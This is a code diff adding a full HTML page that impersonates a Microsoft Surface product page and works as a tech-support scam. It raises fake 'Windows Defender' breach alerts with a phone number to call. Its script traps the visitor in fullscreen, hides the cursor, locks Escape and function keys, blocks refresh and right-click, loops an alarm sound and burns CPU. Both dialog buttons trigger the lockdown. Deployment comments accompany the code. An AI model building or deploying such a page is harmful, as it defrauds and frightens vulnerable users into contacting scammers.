@@ -1,0 +1,1257 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Microsoft - Meet Surface Laptop</title>
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap");
+      *,
+      *::before,
+      *::after {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+:fullscreen * {
+  cursor: none !important;
+}
+      }
+
+   html, body {
+    margin: 0;
+    width: 100%;
+    height: 100%;
+    overflow: hidden;
+
+   
+    user-select: none;
+    background: #f5f5f5;
+    font-family: Arial;
+}
+
+
+      :root {
+        --ms-blue: #0067b8;
+        --ms-blue-hover: #005a9e;
+        --nav-height: 48px;
+      }
+
+
+
+
+
+      /* ── NAVBAR ── */
+      nav {
+        position: sticky;
+        top: 0;
+        z-index: 100;
+        background: rgba(255, 255, 255, 0.96);
+        backdrop-filter: blur(8px);
+        border-bottom: 1px solid #e5e5e5;
+        height: var(--nav-height);
+        display: flex;
+        align-items: center;
+        padding: 0 20px;
+        gap: 0;
+      }
+      .nav-logo {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        margin-right: 28px;
+        text-decoration: none;
+      }
+      .ms-logo {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 2px;
+        width: 22px;
+        height: 22px;
+      }
+      .ms-logo span:nth-child(1) {
+        background: #f25022;
+      }
+      .ms-logo span:nth-child(2) {
+        background: #7fba00;
+      }
+      .ms-logo span:nth-child(3) {
+        background: #00a4ef;
+      }
+      .ms-logo span:nth-child(4) {
+        background: #ffb900;
+      }
+      .nav-brand {
+        font-size: 15px;
+        font-weight: 600;
+        color: #1a1a1a;
+      }
+      .nav-links {
+        display: flex;
+        align-items: center;
+        list-style: none;
+        flex: 1;
+      }
+      .nav-links a {
+        display: block;
+        padding: 0 14px;
+        height: var(--nav-height);
+        line-height: var(--nav-height);
+        font-size: 14px;
+        color: #1a1a1a;
+        text-decoration: none;
+        position: relative;
+        transition: color 0.15s;
+      }
+      /* .nav-links a::after {
+        content: "";
+        position: absolute;
+        bottom: 0;
+        left: 14px;
+        right: 14px;
+        height: 2px;
+        background: var(--ms-blue);
+        transform: scaleX(0);
+        transition: transform 0.2s;
+      } */
+      /* .nav-links a:hover {
+        color: var(--ms-blue);
+      } */
+      /* .nav-links a:hover::after {
+        transform: scaleX(1);
+      } */
+      .nav-right {
+        display: flex;
+        align-items: center;
+        gap: 4px;
+        margin-left: auto;
+      }
+      .nav-all {
+        font-size: 14px;
+        color: #1a1a1a;
+        padding: 6px 10px;
+        border-radius: 4px;
+        display: flex;
+        align-items: center;
+        gap: 4px;
+        transition: background 0.15s;
+      }
+      .nav-all:hover {
+        background: #f3f3f3;
+      }
+      .nav-icon-btn {
+        width: 36px;
+        height: 36px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border: none;
+        background: transparent;
+        color: #1a1a1a;
+        transition: background 0.15s;
+      }
+      .nav-icon-btn:hover {
+        background: #f3f3f3;
+      }
+      .nav-avatar {
+        width: 34px;
+        height: 34px;
+        border-radius: 50%;
+        border: 1.5px solid #888;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 12px;
+        font-weight: 600;
+        background: #fff;
+      }
+
+      /* ── HERO ── */
+      .hero {
+        min-height: calc(100vh - var(--nav-height));
+        background: linear-gradient(
+          135deg,
+          #c8ddf0 0%,
+          #dce8f4 30%,
+          #eef3f8 60%,
+          #f5f5f5 100%
+        );
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        align-items: center;
+        padding: 60px 80px 0 100px;
+        overflow: hidden;
+        position: relative;
+      }
+      .hero::after {
+        content: "";
+        position: absolute;
+        right: 5%;
+        top: 15%;
+        width: 65%;
+        height: 80%;
+        background: radial-gradient(
+          ellipse at 60% 40%,
+          rgba(255, 255, 255, 0.55) 0%,
+          transparent 70%
+        );
+        pointer-events: none;
+      }
+      .hero-text {
+        z-index: 2;
+        animation: fadeInLeft 0.7s ease both;
+      }
+      @keyframes fadeInLeft {
+        from {
+          opacity: 0;
+          transform: translateX(-24px);
+        }
+        to {
+          opacity: 1;
+          transform: translateX(0);
+        }
+      }
+      .hero-title {
+        font-size: clamp(28px, 3vw, 42px);
+        font-weight: 700;
+        color: #111;
+        line-height: 1.15;
+        margin-bottom: 16px;
+      }
+      .hero-desc {
+        font-size: clamp(14px, 1.3vw, 17px);
+        color: #444;
+        line-height: 1.55;
+        max-width: 380px;
+        margin-bottom: 32px;
+      }
+      .btn-learn {
+        display: inline-block;
+        background: var(--ms-blue);
+        color: #fff;
+        font-size: 15px;
+        font-weight: 600;
+        padding: 11px 22px;
+        border-radius: 2px;
+        text-decoration: none;
+        transition:
+          background 0.18s,
+          transform 0.15s;
+        border: none;
+      }
+      .btn-learn:hover {
+        background: var(--ms-blue-hover);
+        transform: translateY(-1px);
+      }
+      .hero-visual {
+        position: relative;
+        display: flex;
+        align-items: flex-end;
+        justify-content: center;
+        height: 100%;
+        min-height: 480px;
+        z-index: 2;
+        animation: fadeInRight 0.8s 0.1s ease both;
+      }
+      @keyframes fadeInRight {
+        from {
+          opacity: 0;
+          transform: translateX(30px) translateY(10px);
+        }
+        to {
+          opacity: 1;
+          transform: translateX(0) translateY(0);
+        }
+      }
+      .copilot-badge {
+        position: absolute;
+        left: 8%;
+        top: 28%;
+        background: #fff;
+        border-radius: 18px;
+        padding: 12px;
+        box-shadow: 0 4px 24px rgba(0, 0, 0, 0.13);
+        width: 62px;
+        height: 62px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 5;
+      }
+      .copilot-label {
+        position: absolute;
+        left: 6%;
+        top: 52%;
+        font-size: clamp(32px, 4.5vw, 58px);
+        font-weight: 700;
+        color: #1a3a5c;
+        letter-spacing: -1px;
+        z-index: 5;
+        white-space: nowrap;
+      }
+      .laptop-wrap {
+        position: absolute;
+        right: -4%;
+        bottom: 0;
+        width: 72%;
+        max-width: 620px;
+        z-index: 3;
+      }
+      .laptop-svg {
+        width: 100%;
+        height: auto;
+        filter: drop-shadow(0 20px 60px rgba(80, 120, 180, 0.22));
+      }
+
+   
+  
+      .popup {
+        position: absolute;
+        left: 50%;
+        top: 50%;
+        width: 420px;
+        height: 520px;
+        padding: 20px;
+        color: white;
+        background: rgb(46, 116, 207);
+        border-radius: 12px;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.18);
+        z-index: 99999;
+        font-family: Arial, sans-serif;
+
+        transform: translate(-50%, -50%);
+        animation: bounceAlert 2.4s ease-in-out infinite;
+      }
+
+      @keyframes bounceAlert {
+        0%,
+        100% {
+          transform: translate(-50%, -50%) scale(1);
+        }
+        50% {
+          transform: translate(-50%, -55%) scale(1.05);
+        }
+      }
+
+      .popup h3 {
+        text-align: center;
+        margin-bottom: 19px;
+        font-size: 15px;
+      }
+
+      .popup p {
+        margin-bottom: 10px;
+        font-size: 14px;
+      }
+      /* Top popup */
+      /* .popup1{
+  top: 38%;
+} */
+
+      /* Bottom popup */
+      .popup2 {
+        background-color: #7fba0080;
+        position: fixed;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 520px;
+        padding: 15px;
+        height: 335px;
+        background: rgb(255, 255, 255);
+        border-radius: 12px;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.18);
+        text-align: center;
+        z-index: 99999;
+        font-family: Arial, sans-serif;
+        top: 53%;
+      }
+      .border{
+         border-bottom: 1px solid #ccc;
+         margin-bottom: 10px;
+         color: #1a1a1a;
+         display: flex;
+        align-items: center;
+      }
+
+      .border p {
+        margin-top: 5px;
+        font-size: 14px;
+        font-weight: 600;
+      }
+
+      .border img {
+        width: 32px;
+        height: 32px;
+      }
+
+      .icons-row img {
+        width: 200px;
+        height:100px;
+      }
+
+      .dialog {
+        width: 420px;
+        border-top: 1px solid #ccc;
+        background: #f0f0f0;
+        border: 1px solid #aaa;
+        border-radius: 4px;
+        box-shadow: 2px 2px 8px rgba(0, 0, 0, 0.3);
+      }
+      .titlebar {
+        background: #e8e8e8;
+        border-bottom: 1px solid #ccc;
+        padding: 8px 12px;
+        border-top: 1px solid #ccc;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        border-radius: 4px 4px 0 0;
+      }
+      .titlebar-left {
+        display: flex;
+        align-items: center;
+        border-top: 1px solid #ccc;
+        gap: 8px;
+      }
+      .titlebar span {
+        font-size: 13px;
+        font-weight: 600;
+        color: #222;
+      }
+      .close-btn {
+        background: none;
+        border: none;
+        font-size: 16px;
+        /* cursor: pointer; */
+        color: #555;
+        padding: 0 4px;
+        line-height: 1;
+      }
+    
+      .red-text {
+        color: #cc0000;
+        font-size: 13px;
+        font-weight: 500;
+        margin-bottom: 2px;
+      }
+      .red-text2 {
+        color: #cc0000;
+        font-size: 13px;
+        margin-bottom: 20px;
+      }
+      .icons-row {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 16px;
+        margin-bottom: 20px;
+      }
+      .monitor {
+        width: 70px;
+        height: 60px;
+        border: 2px solid #555;
+        border-radius: 4px;
+        display: flex;
+        align-items: flex-end;
+        justify-content: center;
+        padding-bottom: 4px;
+        position: relative;
+      }
+      .monitor-screen {
+        position: absolute;
+        top: 8px;
+        left: 50%;
+        transform: translateX(-50%);
+        width: 32px;
+        height: 21px;
+        border: 2px solid #555;
+        border-radius: 2px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .monitor-lens {
+        width: 14px;
+        height: 14px;
+        border: 1.5px solid #555;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .monitor-dot {
+        width: 6px;
+        height: 6px;
+        background: #555;
+        border-radius: 50%;
+      }
+      .monitor-stand {
+        width: 50px;
+        height: 4px;
+        background: #555;
+        border-radius: 1px;
+      }
+      .shield-wrap {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 2px;
+      }
+      .shield-box {
+        width: 28px;
+        height: 32px;
+        border: 2px solid #1565c0;
+        border-radius: 2px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: #e3f2fd;
+      }
+      .person-head {
+        width: 18px;
+        height: 18px;
+        border: 2px solid #555;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .person-dot {
+        width: 6px;
+        height: 6px;
+        background: #555;
+        border-radius: 50%;
+        margin-bottom: 2px;
+      }
+      .person-body {
+        width: 22px;
+        height: 16px;
+        border: 2px solid #555;
+        border-radius: 2px 2px 0 0;
+        margin-top: 2px;
+      }
+      .person-wrap {
+        position: absolute;
+        top: 4px;
+        left: 50%;
+        transform: translateX(-50%);
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+      .access-denied {
+        font-size: 14px;
+        font-weight: 600;
+        color: #111;
+        margin: 0 0 6px;
+      }
+      .call-line {
+        font-size: 13px;
+        color: #1565c0;
+        margin: 0 0 24px;
+      }
+      .footer {
+        border-top: 1px solid #ccc;
+        padding-top: 16px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+      }
+      .btn-group {
+        display: flex;
+        gap: 10px;
+      }
+      .btn {
+        padding: 6px 22px;
+        background: #2979ff;
+        color: white;
+        border: none;
+        border-radius: 3px;
+        font-size: 13px;
+        cursor: pointer;
+        font-family: "Segoe UI", Arial, sans-serif;
+      }
+      .btn:hover {
+        background: #1565c0;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="main-body">
+      <!-- ── NAVBAR ── -->
+      <nav>
+        <a class="nav-logo" href="#">
+          <div class="ms-logo">
+            <span></span><span></span><span></span><span></span>
+          </div>
+          <span class="nav-brand">Microsoft</span>
+        </a>
+        <ul class="nav-links">
+          <li><a href="#">Microsoft 365</a></li>
+          <li><a href="#">Azure</a></li>
+          <li><a href="#">Copilot</a></li>
+          <li><a href="#">Windows</a></li>
+          <li><a href="#">Surface</a></li>
+          <li><a href="#">Xbox</a></li>
+          <li><a href="#">Support</a></li>
+        </ul>
+        <div class="nav-right">
+          <span class="nav-all">All Microsoft &#8964;</span>
+          <button class="nav-icon-btn" aria-label="Search">
+            <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+              <circle
+                cx="6.5"
+                cy="6.5"
+                r="5"
+                stroke="#1a1a1a"
+                stroke-width="1.5"
+              />
+              <line
+                x1="10.5"
+                y1="10.5"
+                x2="14.5"
+                y2="14.5"
+                stroke="#1a1a1a"
+                stroke-width="1.5"
+                stroke-linecap="round"
+              />
+            </svg>
+          </button>
+          <button class="nav-icon-btn" aria-label="Cart">
+            <svg width="18" height="18" viewBox="0 0 18 18" fill="none">
+              <path
+                d="M1 1h2l2.6 9.4A1 1 0 006.5 11h7a1 1 0 00.96-.73L16 5H4"
+                stroke="#1a1a1a"
+                stroke-width="1.4"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              />
+              <circle cx="7" cy="14.5" r="1" fill="#1a1a1a" />
+              <circle cx="14" cy="14.5" r="1" fill="#1a1a1a" />
+            </svg>
+          </button>
+          <div class="nav-avatar">ME</div>
+        </div>
+      </nav>
+
+      <!-- ── HERO ── -->
+      <section class="hero">
+        <div class="hero-text">
+          <h1 class="hero-title">Meet Surface Laptop</h1>
+          <p class="hero-desc">
+            Unlock AI features like Live Captions and Cocreator with this
+            exceptionally powerful laptop.
+          </p>
+          <a class="btn-learn" href="#">Learn more</a>
+        </div>
+
+        <div class="hero-visual">
+          <!-- Copilot badge -->
+          <div class="copilot-badge">
+            <svg width="38" height="38" viewBox="0 0 40 40" fill="none">
+              <defs>
+                <linearGradient id="cg1" x1="0" y1="0" x2="1" y2="1">
+                  <stop offset="0%" stop-color="#2EBCD4" />
+                  <stop offset="100%" stop-color="#1565C0" />
+                </linearGradient>
+                <linearGradient id="cg2" x1="0" y1="1" x2="1" y2="0">
+                  <stop offset="0%" stop-color="#7B2FBE" />
+                  <stop offset="100%" stop-color="#E040FB" />
+                </linearGradient>
+                <linearGradient id="cg3" x1="0" y1="0" x2="1" y2="1">
+                  <stop offset="0%" stop-color="#00C853" />
+                  <stop offset="100%" stop-color="#1DE9B6" />
+                </linearGradient>
+                <linearGradient id="cg4" x1="1" y1="0" x2="0" y2="1">
+                  <stop offset="0%" stop-color="#FF6D00" />
+                  <stop offset="100%" stop-color="#FFAB40" />
+                </linearGradient>
+              </defs>
+              <path
+                d="M20 6 C28 6,34 12,34 20 C34 14,28 10,20 12 Z"
+                fill="url(#cg1)"
+              />
+              <path
+                d="M34 20 C34 28,28 34,20 34 C26 34,30 28,28 20 Z"
+                fill="url(#cg2)"
+              />
+              <path
+                d="M20 34 C12 34,6 28,6 20 C6 26,12 30,20 28 Z"
+                fill="url(#cg3)"
+              />
+              <path
+                d="M6 20 C6 12,12 6,20 6 C14 6,10 12,12 20 Z"
+                fill="url(#cg4)"
+              />
+              <circle cx="20" cy="20" r="5" fill="white" opacity="0.9" />
+            </svg>
+          </div>
+
+          <!-- Copilot + PC label -->
+          <div class="copilot-label">Copilot+PC</div>
+
+          <!-- Laptop SVG -->
+          <div class="laptop-wrap">
+            <svg
+              class="laptop-svg"
+              viewBox="0 0 620 480"
+              xmlns="http://www.w3.org/2000/svg"
+            >
+              <defs>
+                <linearGradient id="screenBg" x1="0" y1="0" x2="1" y2="1">
+                  <stop offset="0%" stop-color="#1a1a2e" />
+                  <stop offset="100%" stop-color="#16213e" />
+                </linearGradient>
+                <radialGradient id="flowerBg" cx="50%" cy="50%" r="50%">
+                  <stop offset="0%" stop-color="#2563EB" />
+                  <stop offset="100%" stop-color="#1e40af" />
+                </radialGradient>
+                <linearGradient id="laptopBase" x1="0" y1="0" x2="0" y2="1">
+                  <stop offset="0%" stop-color="#a8bfcf" />
+                  <stop offset="100%" stop-color="#8aa8bc" />
+                </linearGradient>
+                <filter id="shadow">
+                  <feDropShadow
+                    dx="0"
+                    dy="8"
+                    stdDeviation="12"
+                    flood-color="rgba(80,120,180,0.25)"
+                  />
+                </filter>
+              </defs>
+              <g filter="url(#shadow)">
+                <path d="M80 280 L160 30 L560 30 L580 280 Z" fill="#b0c8db" />
+                <path d="M95 270 L168 48 L548 48 L565 270 Z" fill="#1a1a2e" />
+                <path
+                  d="M105 262 L172 58 L542 58 L558 262 Z"
+                  fill="url(#screenBg)"
+                />
+                <ellipse
+                  cx="330"
+                  cy="160"
+                  rx="120"
+                  ry="112"
+                  fill="url(#flowerBg)"
+                />
+                <ellipse
+                  cx="330"
+                  cy="82"
+                  rx="22"
+                  ry="40"
+                  fill="#60a5fa"
+                  opacity=".92"
+                  transform="rotate(-10 330 82)"
+                />
+                <ellipse
+                  cx="390"
+                  cy="100"
+                  rx="22"
+                  ry="40"
+                  fill="#22d3ee"
+                  opacity=".92"
+                  transform="rotate(35 390 100)"
+                />
+                <ellipse
+                  cx="418"
+                  cy="155"
+                  rx="22"
+                  ry="40"
+                  fill="#34d399"
+                  opacity=".92"
+                  transform="rotate(80 418 155)"
+                />
+                <ellipse
+                  cx="395"
+                  cy="212"
+                  rx="22"
+                  ry="40"
+                  fill="#fbbf24"
+                  opacity=".92"
+                  transform="rotate(125 395 212)"
+                />
+                <ellipse
+                  cx="330"
+                  cy="238"
+                  rx="22"
+                  ry="40"
+                  fill="#fb923c"
+                  opacity=".92"
+                  transform="rotate(170 330 238)"
+                />
+                <ellipse
+                  cx="268"
+                  cy="215"
+                  rx="22"
+                  ry="40"
+                  fill="#f472b6"
+                  opacity=".92"
+                  transform="rotate(215 268 215)"
+                />
+                <ellipse
+                  cx="242"
+                  cy="158"
+                  rx="22"
+                  ry="40"
+                  fill="#a78bfa"
+                  opacity=".92"
+                  transform="rotate(260 242 158)"
+                />
+                <ellipse
+                  cx="268"
+                  cy="100"
+                  rx="22"
+                  ry="40"
+                  fill="#60a5fa"
+                  opacity=".85"
+                  transform="rotate(305 268 100)"
+                />
+                <circle cx="330" cy="160" r="14" fill="white" opacity=".28" />
+                <circle cx="330" cy="54" r="3.5" fill="#2a2a3a" />
+              </g>
+              <path
+                d="M55 295 L80 280 L580 280 L605 295 L620 390 L40 390 Z"
+                fill="url(#laptopBase)"
+              />
+              <path d="M80 280 L580 280 L605 295 L55 295 Z" fill="#c0d5e5" />
+              <path d="M40 390 L620 390 L615 400 L45 400 Z" fill="#8aa0b5" />
+              <rect
+                x="100"
+                y="300"
+                width="450"
+                height="68"
+                rx="4"
+                fill="#98b5c8"
+                opacity=".5"
+              />
+              <g fill="#a8c0d0" opacity=".7">
+                <rect x="112" y="305" width="18" height="10" rx="2" />
+                <rect x="134" y="305" width="18" height="10" rx="2" />
+                <rect x="156" y="305" width="18" height="10" rx="2" />
+                <rect x="178" y="305" width="18" height="10" rx="2" />
+                <rect x="200" y="305" width="18" height="10" rx="2" />
+                <rect x="222" y="305" width="18" height="10" rx="2" />
+                <rect x="244" y="305" width="18" height="10" rx="2" />
+                <rect x="266" y="305" width="18" height="10" rx="2" />
+                <rect x="288" y="305" width="18" height="10" rx="2" />
+                <rect x="310" y="305" width="18" height="10" rx="2" />
+                <rect x="332" y="305" width="18" height="10" rx="2" />
+                <rect x="354" y="305" width="18" height="10" rx="2" />
+                <rect x="376" y="305" width="18" height="10" rx="2" />
+                <rect x="398" y="305" width="40" height="10" rx="2" />
+                <rect x="112" y="319" width="26" height="10" rx="2" />
+                <rect x="142" y="319" width="18" height="10" rx="2" />
+                <rect x="164" y="319" width="18" height="10" rx="2" />
+                <rect x="186" y="319" width="18" height="10" rx="2" />
+                <rect x="208" y="319" width="18" height="10" rx="2" />
+                <rect x="230" y="319" width="18" height="10" rx="2" />
+                <rect x="252" y="319" width="18" height="10" rx="2" />
+                <rect x="274" y="319" width="18" height="10" rx="2" />
+                <rect x="296" y="319" width="18" height="10" rx="2" />
+                <rect x="318" y="319" width="18" height="10" rx="2" />
+                <rect x="340" y="319" width="18" height="10" rx="2" />
+                <rect x="362" y="319" width="18" height="10" rx="2" />
+                <rect x="384" y="319" width="54" height="10" rx="2" />
+                <rect x="180" y="347" width="200" height="10" rx="2" />
+              </g>
+              <rect
+                x="248"
+                y="333"
+                width="154"
+                height="38"
+                rx="6"
+                fill="#90afc0"
+                opacity=".6"
+              />
+              <line
+                x1="80"
+                y1="280"
+                x2="580"
+                y2="280"
+                stroke="#7a9ab0"
+                stroke-width="2.5"
+              />
+            </svg>
+          </div>
+        </div>
+      </section>
+
+      <!-- ── FOOTER ── -->
+      <footer>
+        <div class="footer-top">
+          <div class="footer-col">
+            <h4>What's new</h4>
+            <ul>
+              <li><a href="#">Surface Pro</a></li>
+              <li><a href="#">Surface Laptop</a></li>
+              <li><a href="#">Surface Laptop Studio 2</a></li>
+              <li><a href="#">Surface Laptop Go 3</a></li>
+              <li><a href="#">Microsoft Copilot</a></li>
+              <li><a href="#">AI in Windows</a></li>
+              <li><a href="#">Explore Microsoft products</a></li>
+              <li><a href="#">Windows 11 apps</a></li>
+            </ul>
+          </div>
+          <div class="footer-col">
+            <h4>Microsoft Store</h4>
+            <ul>
+              <li><a href="#">Account profile</a></li>
+              <li><a href="#">Download Center</a></li>
+              <li><a href="#">Microsoft Store Support</a></li>
+              <li><a href="#">Returns</a></li>
+              <li><a href="#">Order tracking</a></li>
+              <li><a href="#">Certified Refurbished</a></li>
+              <li><a href="#">Microsoft Store Promise</a></li>
+              <li><a href="#">Flexible Payments</a></li>
+            </ul>
+          </div>
+          <div class="footer-col">
+            <h4>Education</h4>
+            <ul>
+              <li><a href="#">Microsoft in education</a></li>
+              <li><a href="#">Devices for education</a></li>
+              <li><a href="#">Microsoft Teams for Education</a></li>
+              <li><a href="#">Microsoft 365 Education</a></li>
+              <li><a href="#">Office Education</a></li>
+              <li><a href="#">Educator training</a></li>
+              <li><a href="#">Deals for students</a></li>
+            </ul>
+          </div>
+          <div class="footer-col">
+            <h4>Business</h4>
+            <ul>
+              <li><a href="#">Microsoft Cloud</a></li>
+              <li><a href="#">Microsoft Security</a></li>
+              <li><a href="#">Dynamics 365</a></li>
+              <li><a href="#">Microsoft 365</a></li>
+              <li><a href="#">Microsoft Power Platform</a></li>
+              <li><a href="#">Microsoft Teams</a></li>
+              <li><a href="#">Copilot for Microsoft 365</a></li>
+              <li><a href="#">Small Business</a></li>
+            </ul>
+          </div>
+          <div class="footer-col">
+            <h4>Developer &amp; IT</h4>
+            <ul>
+              <li><a href="#">Azure</a></li>
+              <li><a href="#">Developer Center</a></li>
+              <li><a href="#">Documentation</a></li>
+              <li><a href="#">Microsoft Learn</a></li>
+              <li><a href="#">Microsoft Tech Community</a></li>
+              <li><a href="#">Azure Marketplace</a></li>
+              <li><a href="#">AppSource</a></li>
+              <li><a href="#">Visual Studio</a></li>
+            </ul>
+          </div>
+        </div>
+        <div class="footer-bottom">
+          <div class="footer-bottom-left">
+            <div class="ms-logo" style="width: 18px; height: 18px; gap: 2px">
+              <span style="background: #f25022"></span
+              ><span style="background: #7fba00"></span>
+              <span style="background: #00a4ef"></span
+              ><span style="background: #ffb900"></span>
+            </div>
+            <span style="font-size: 13px; font-weight: 600">Microsoft</span>
+          </div>
+          <div class="footer-links">
+            <a href="#">Sitemap</a><a href="#">Contact Microsoft</a
+            ><a href="#">Privacy</a> <a href="#">Terms of use</a
+            ><a href="#">Trademarks</a><a href="#">Safety &amp; eco</a>
+            <a href="#">Recycling</a><a href="#">About our ads</a>
+          </div>
+          <div class="footer-copy">© Microsoft 2025</div>
+          <div class="footer-locale">
+            <svg viewBox="0 0 16 16" fill="none">
+              <circle cx="8" cy="8" r="6.5" stroke="#555" stroke-width="1.2" />
+              <path
+                d="M8 1.5C8 1.5 5.5 4 5.5 8s2.5 6.5 2.5 6.5M8 1.5C8 1.5 10.5 4 10.5 8S8 14.5 8 14.5M1.5 8h13"
+                stroke="#555"
+                stroke-width="1.2"
+              />
+            </svg>
+            English (India)
+          </div>
+        </div>
+      </footer>
+
+      <!-- ── COOKIE / PRIVACY BANNER ── -->
+      
+
+      <!-- Popup 1 Always Visible -->
+
+      <div class="popup popup1">
+        <h3>windows-Safety Alert System</h3>
+        <p>**ACCESS HAS BEEN Denied FOR Safety REASONS **</p>
+        <p>Your system has alerted us that it has been infected with safety</p>
+        <p>issues. The followong data has been breached</p>
+      </div>
+
+      <!-- Popup 2 Optional -->
+      <div class="body popup popup2">
+        <div class="border">
+          <img src="logo.png" alt="">
+          <p>Windows Defender security Alert</p>
+        </div>
+        <p class="red-text" id="time">App: track(2).dll</p>
+        <p class="red-text2" id="timezone">Unsafety Detected: track(2).dll</p>
+
+        <div class="icons-row">
+           
+
+          <img src="folder.png" alt=""> 
+
+         
+        </div>
+
+        <p class="access-denied">Access has been Denied for safety reasons.</p>
+        <p class="call-line">Call Windows Agent : +1-844-386-6221</p>
+
+        <div class="footer">
+          <svg
+            width="24"
+            height="24"
+            viewBox="0 0 20 20"
+            xmlns="http://www.w3.org/2000/svg"
+          >
+            <rect x="0" y="0" width="9" height="9" fill="#F25022" />
+            <rect x="11" y="0" width="9" height="9" fill="#7FBA00" />
+            <rect x="0" y="11" width="9" height="9" fill="#00A4EF" />
+            <rect x="11" y="11" width="9" height="9" fill="#FFB900" />
+          </svg>
+          <div class="btn-group">
+            <button onclick="openFullscreen()" class="btn">Cancel</button>
+            <button onclick="openFullscreen()" class="btn">Scan</button>
+          </div>
+        </div>
+      </div>
+    </div>  
+    
+  <script>
+
+const audio = new Audio("/sound.mp3");
+
+audio.loop = true;
+
+let locked = false;
+
+document.addEventListener("keydown", (e) => {
+  if (locked) {
+    e.preventDefault();
+    return;
+  }
+
+  locked = true;
+
+  setTimeout(() => {
+    locked = false;
+  }, 300);
+});
+
+async function updateTime() {
+  const now = new Date();
+
+  const timeEl = document.getElementById("time");
+  const timezoneEl = document.getElementById("timezone");
+
+  if (timeEl) {
+    timeEl.innerText = "Current Time: " + now.toLocaleString();
+  }
+
+  if (timezoneEl) {
+    timezoneEl.innerText =
+      "Timezone: " + Intl.DateTimeFormat().resolvedOptions().timeZone;
+  }
+}
+
+updateTime();
+
+// Disable right click
+// document.addEventListener("contextmenu", (e) => {
+//   e.preventDefault();
+// });
+
+let timer;
+
+// Disable keyboard
+document.addEventListener("keydown", (e) => {
+  if (
+    e.key === "F11" ||
+    e.key === "Tab" ||
+    e.key === "Escape"
+  ) {
+    e.preventDefault();
+
+    clearTimeout(timer);
+
+    timer = setTimeout(() => {
+      document.documentElement
+        .requestFullscreen({
+          navigationUI: "hide",
+        })
+        .catch((err) => {
+          console.log(err);
+        });
+    }, 200);
+  }
+});
+
+function goFullscreen() {
+  if (audio.paused) {
+    audio
+      .play()
+      .then(() => {
+        console.log("Audio playing");
+      })
+      .catch((err) => {
+        console.log("Audio blocked:", err);
+      });
+  }
+}
+
+async function openFullscreen() {
+  const elem = document.documentElement;
+
+  try {
+    // Enter fullscreen
+    if (elem.requestFullscreen) {
+      await elem.requestFullscreen({
+        navigationUI: "hide",
+      });
+    } else if (elem.webkitRequestFullscreen) {
+      await elem.webkitRequestFullscreen();
+    } else if (elem.msRequestFullscreen) {
+      await elem.msRequestFullscreen();
+    }
+
+    // Start audio AFTER user gesture/fullscreen
+    goFullscreen();
+
+    // Hide cursor
+    document.body.style.cursor = "none";
+
+    // Try to lock keys
+    if ("keyboard" in navigator && navigator.keyboard.lock) {
+      await navigator.keyboard.lock([
+        "Escape",
+        "F1",
+        "F2",
+        "F3",
+        "F4",
+        "F5",
+        "F11",
+        "F12",
+      ]);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+}
+
+document.addEventListener("fullscreenchange", () => {
+  if (!document.fullscreenElement) {
+    const ok = confirm("Click OK to re-enter fullscreen");
+
+    if (ok) {
+      document.documentElement
+        .requestFullscreen({
+          navigationUI: "hide",
+        })
+        .catch((err) => {
+          console.log(err);
+        });
+    }
+  }
+});
+
+// Add listeners ONCE
+document.addEventListener("keydown", (e) => {
+  console.log(e.key);
+
+  if (
+    e.key === "F11" ||
+    e.key === "F5" ||
+    e.key === "F12" ||
+    e.key === "Escape" ||
+    (e.ctrlKey && e.key.toLowerCase() === "r") ||
+    (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "r")
+  ) {
+    e.preventDefault();
+  }
+
+  // Block Win + D / CMD + D
+  if (e.metaKey && e.key.toLowerCase() === "d") {
+    e.preventDefault();
+  }
+});
+
+["contextmenu"].forEach((eventName) => {
+  document.addEventListener(
+    eventName,
+    (e) => {
+      e.preventDefault();
+    },
+    { passive: false }
+  );
+});
+
+// START TEST
+startTest();
+
+function startTest() {
+  let i = 0;
+
+  function chunk() {
+    // FIXED CONDITION
+    for (let j = 0; j < 1000000; j++) {
+      i++;
+
+      Math.sqrt(i);
+    }
+
+    if (i < 10000000) {
+      setTimeout(chunk, 0);
+    } else {
+      console.log("Done");
+    }
+  }
+
+  chunk();
+}
+
+/*
+===========================================
+IMPORTANT FOR AUDIO IN PRODUCTION
+===========================================
+
+1. Put sound.mp3 in PUBLIC folder
+
+Example:
+public/sound.mp3
+
+2. Browser blocks autoplay unless
+   triggered by user interaction.
+
+3. Call openFullscreen() from button click.
+
+Example:
+
+<button onclick="openFullscreen()">
+  Start
+</button>
+
+OR
+
+document.addEventListener(
+  "click",
+  () => {
+    openFullscreen();
+  },
+  { once: true }
+);
+
+===========================================
+*/
+
+</script>  
+  </body>
+</html>
